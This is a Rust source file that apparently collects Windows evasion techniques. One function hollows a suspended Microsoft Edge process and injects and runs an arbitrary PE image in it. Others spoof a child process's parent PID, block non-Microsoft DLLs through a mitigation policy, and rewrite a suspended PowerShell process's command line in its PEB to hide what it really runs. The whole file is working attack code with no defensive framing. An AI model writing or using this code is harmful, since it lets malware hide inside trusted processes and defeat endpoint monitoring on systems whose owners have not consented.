use std::{fs, mem::size_of, os::raw::c_void};
use windows::{
    core::{s, PCSTR, PSTR, PWSTR},
    Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS},
    Win32::{
        Foundation::{self, CloseHandle, HANDLE, HMODULE},
        System::{
            Diagnostics::Debug::{
                GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
                CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64,
            },
            LibraryLoader::GetModuleFileNameA,
            Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE},
            SystemServices::IMAGE_BASE_RELOCATION,
            Threading::{
                CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
                OpenProcess, ResumeThread, UpdateProcThreadAttribute, CREATE_SUSPENDED,
                EXTENDED_STARTUPINFO_PRESENT, LPPROC_THREAD_ATTRIBUTE_LIST, PEB,
                PROCESS_BASIC_INFORMATION, PROCESS_CREATE_PROCESS,
                PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA,
                STARTUPINFOEXA,
            },
        },
    },
};

mod winpe;
use winpe::{parse, RelocationEntry, utils};

// Constants for process creation and PE parsing
const PEB_IMAGE_BASE_OFFSET: u64 = 0x10;
const PROCESS_MITIGATION_POLICY: u64 = 0x100000000000; // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
const RELOC_DIR_INDEX: usize = 5; // DataDirectory index for base relocations

pub fn get_current_filename() -> String {
    let mut buffer: [u8; 260] = [0; 260]; // MAX_PATH is typically 260
    let length = unsafe { GetModuleFileNameA(HMODULE::default(), &mut buffer) };

    String::from_utf8(buffer[..length as usize].to_vec())
        .expect("Failed to convert buffer to String")
}

/// Helper function to initialize process thread attribute list for extended startup info
fn setup_proc_thread_attribute_list() -> (STARTUPINFOEXA, Box<[u8]>) {
    let mut startup_info = STARTUPINFOEXA::default();
    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;

    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
    let mut lp_size = 0;
    unsafe {
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
            1,
            0,
            &mut lp_size,
        );
    };

    // Create the memory needed for the attribute list
    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
    
    // Initialize the list
    unsafe {
        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
    };

    (startup_info, attribute_list)
}

// This currently works only for x64. For x86 registers and offsets need to be adjusted.
pub fn process_hollowing(filename: String) {
    let mut contents = fs::read(filename.clone()).expect("Could not read file");
    let pe = parse(contents.clone());

    // Get headers from PE structure instead of raw pointers
    let dos_header = pe.get_dos_header();
    let nt_headers = pe.get_nt_headers_x64();
    let section_header_ptr = pe.get_section_headers_ptr();

    let mut startup_info = STARTUPINFOA::default();
    startup_info.cb = size_of::<STARTUPINFOA>() as u32;
    let mut process_info = PROCESS_INFORMATION::default();

    let _ = unsafe {
        CreateProcessA(
            s!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0"),
            PSTR::null(),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &startup_info,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // this pattern is used instead of VirtualAlloc
    let mut ctx_box: Box<[u8]> = vec![0; size_of::<CONTEXT>()].into_boxed_slice();
    let ctx = ctx_box.as_mut_ptr() as *mut _ as *mut CONTEXT;
    unsafe {
        (*ctx).ContextFlags = CONTEXT_FULL_AMD64;
    }

    unsafe {
        GetThreadContext(process_info.hThread, ctx).expect("Could not get thread context");
    }

    let image_base = unsafe {
        VirtualAllocEx(
            process_info.hProcess,
            //Some((*nt_headers).OptionalHeader.ImageBase as *const c_void),
            None,
            nt_headers.OptionalHeader.SizeOfImage as usize,
            VIRTUAL_ALLOCATION_TYPE(0x3000),
            PAGE_EXECUTE_READWRITE,
        )
    };

    let delta_image =
        unsafe { image_base.sub(nt_headers.OptionalHeader.ImageBase as usize) } as i64;
    let reloc_header = nt_headers.OptionalHeader.DataDirectory[RELOC_DIR_INDEX];
    // Check if a relocation header is present and if the image base is not the preferred image base
    if delta_image != 0 && reloc_header.VirtualAddress != 0 {
        // If so, do the relocation
        unsafe {
            let nt_headers_mut = (contents.as_mut_ptr().add(dos_header.e_lfanew as usize)) as *mut IMAGE_NT_HEADERS64;
            (*nt_headers_mut).OptionalHeader.ImageBase = image_base as u64;
            
            let image_relocation_section = pe.get_section_by_virtual_address(reloc_header.VirtualAddress);
            let mut reloc_offset: usize = 0;
            while reloc_offset < reloc_header.Size as usize {
                let image_base_relocation = contents
                    .as_ptr()
                    .add(image_relocation_section.PointerToRawData as usize)
                    .add(reloc_offset)
                    as *const IMAGE_BASE_RELOCATION;
                reloc_offset += size_of::<IMAGE_BASE_RELOCATION>();
                let number_of_entries = ((*image_base_relocation).SizeOfBlock as usize
                    - size_of::<IMAGE_BASE_RELOCATION>())
                    / size_of::<RelocationEntry>();
                for _ in 0..number_of_entries {
                    let image_relocation_entry = contents
                        .as_ptr()
                        .add(image_relocation_section.PointerToRawData as usize)
                        .add(reloc_offset)
                        as *const RelocationEntry;
                    reloc_offset += size_of::<RelocationEntry>();
                    if (*image_relocation_entry).type_() == 0 {
                        continue;
                    }
                    let relocation_address_va = (*image_base_relocation).VirtualAddress as usize
                        + (*image_relocation_entry).offset() as usize;
                    let relocation_address_offset = pe.rva_to_file_offset(relocation_address_va);
                    let mut patched_address = utils::read_address(&contents, relocation_address_offset);
                    patched_address += delta_image;
                    utils::write_address(&mut contents, relocation_address_offset, patched_address);
                }
            }
        }
    }

    // Writing (patched) headers
    unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            image_base as *const c_void,
            contents.as_ptr() as *const c_void,
            nt_headers.OptionalHeader.SizeOfHeaders as usize,
            None,
        )
        .expect("Could not write to process memory");

        for i in 0..nt_headers.FileHeader.NumberOfSections {
            let curr_section_header = *(section_header_ptr.add(i as usize));
            WriteProcessMemory(
                process_info.hProcess,
                image_base.add(curr_section_header.VirtualAddress as usize),
                contents
                    .as_ptr()
                    .add(curr_section_header.PointerToRawData as usize)
                    as *const c_void,
                curr_section_header.SizeOfRawData as usize,
                None,
            )
            .expect("Could not write to process memory");
        }

        // Change image base
        if delta_image != 0 {
            WriteProcessMemory(
                process_info.hProcess,
                ((*ctx).Rdx + PEB_IMAGE_BASE_OFFSET) as *const c_void,
                &image_base as *const _ as *const c_void,
                size_of::<*const c_void>() as usize,
                None,
            )
            .expect("Could not write to image base");
        }

        // Change entrypoint of thread
        (*ctx).Rcx =
            image_base.add(nt_headers.OptionalHeader.AddressOfEntryPoint as usize) as u64;
        SetThreadContext(process_info.hThread, ctx).expect("Could not set thread context");
        ResumeThread(process_info.hThread);
    }
}

pub fn apply_process_mitigation_policy() {
    let (startup_info, _attribute_list) = setup_proc_thread_attribute_list();

    // Update the list so that it contains the mitigation policy
    unsafe {
        let _ = UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
            Some(&PROCESS_MITIGATION_POLICY as *const _ as *const c_void),
            size_of::<u64>(),
            None,
            None,
        )
        .expect("Could not update ProcThreadAttribute");
    }

    // The updated list can then be used within CreateProcess with the EXTENDED_STARTUPINFO_PRESENT flag
    let mut process_info = PROCESS_INFORMATION::default();
    let _ = unsafe {
        CreateProcessA(
            PCSTR("C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR(String::from("\"C:\\Windows\\System32\\notepad.exe\"\0").as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // Clean up
    unsafe {
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
    };
}

pub fn spoof_ppid(ppid: u32) {
    let (startup_info, _attribute_list) = setup_proc_thread_attribute_list();

    // Open handle to PPID
    let handle_parent = unsafe {
        OpenProcess(PROCESS_CREATE_PROCESS, false, ppid)
            .expect("Could not open handle to parent process.")
    };

    // Update the list so that it contains the PPID
    unsafe {
        let _ = UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            Some(&handle_parent as *const _ as *const c_void),
            size_of::<HANDLE>(),
            None,
            None,
        );
    }

    // The updated list can then be used within CreateProcess with the EXTENDED_STARTUPINFO_PRESENT flag
    let mut process_info = PROCESS_INFORMATION::default();
    let _ = unsafe {
        CreateProcessA(
            PCSTR("C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR(String::from("\"C:\\Windows\\System32\\notepad.exe\"\0").as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // Clean up
    unsafe {
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
        let _ = CloseHandle(handle_parent);
    };
}

pub fn spoof_arguments() {
    let mut startup_info = STARTUPINFOA::default();
    startup_info.cb = size_of::<STARTUPINFOA>() as u32;
    let mut process_info = PROCESS_INFORMATION::default();

    unsafe {
        // Keep in mind that the fake arguments need to be longer then the real arguments.
        let _ = CreateProcessA(
            PCSTR("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0".as_ptr()),
            PSTR(String::from("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"(Get-PSDrive $Env:SystemDrive.Trim(':')).Free/1GB\"\0").as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &startup_info,
            &mut process_info
        ).expect("Could not create process");

        let mut process_basic_info = PROCESS_BASIC_INFORMATION::default();

        let mut return_length = 0;
        NtQueryInformationProcess(
            process_info.hProcess,
            PROCESSINFOCLASS(0),
            &mut process_basic_info as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        // Read PEB from new process
        let mut process_environment_block = PEB::default();
        ReadProcessMemory(
            process_info.hProcess,
            process_basic_info.PebBaseAddress as *const c_void,
            &mut process_environment_block as *mut _ as *mut c_void,
            size_of::<PEB>(),
            None,
        )
        .expect("Could not read PEB");

        // Read arguments from new process
        let mut parameters = RTL_USER_PROCESS_PARAMETERS::default();
        ReadProcessMemory(
            process_info.hProcess,
            process_environment_block.ProcessParameters as *const c_void,
            &mut parameters as *mut _ as *mut c_void,
            size_of::<RTL_USER_PROCESS_PARAMETERS>(),
            None,
        )
        .expect("Could not read arguments");

        let mut encoded_args: Vec<u16> = "powershell -c \"Write-Host Hello World\"\0"
            .encode_utf16()
            .collect();

        // Patching the length. This step is optional.
        // If this step is skipped the arguments string will be printed in full length when examined through ProcessHacker
        let length = size_of::<u16>() * encoded_args.len();
        let offset = size_of::<[u8; 16]>()
            + size_of::<[*mut c_void; 10]>()
            + size_of::<Foundation::UNICODE_STRING>();
        WriteProcessMemory(
            process_info.hProcess,
            (process_environment_block.ProcessParameters as *const c_void).add(offset),
            &length as *const usize as *const c_void,
            size_of::<u16>(),
            None,
        )
        .expect("Could not write length");

        // Clear out the old arguments.
        WriteProcessMemory(
            process_info.hProcess,
            parameters.CommandLine.Buffer.as_ptr() as *const c_void,
            vec![0; (parameters.CommandLine.Length) as usize].as_ptr() as *const c_void,
            parameters.CommandLine.Length as usize,
            None,
        )
        .expect("Could not clean arguments");

        // Patching the new arguments.
        let real_args = PWSTR(encoded_args.as_mut_ptr());
        WriteProcessMemory(
            process_info.hProcess,
            parameters.CommandLine.Buffer.as_ptr() as *const c_void,
            real_args.as_ptr() as *const c_void,
            size_of::<u16>() * encoded_args.len(),
            None,
        )
        .expect("Could not write arguments");

        ResumeThread(process_info.hThread);

        // Cleanup
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);
    };
}
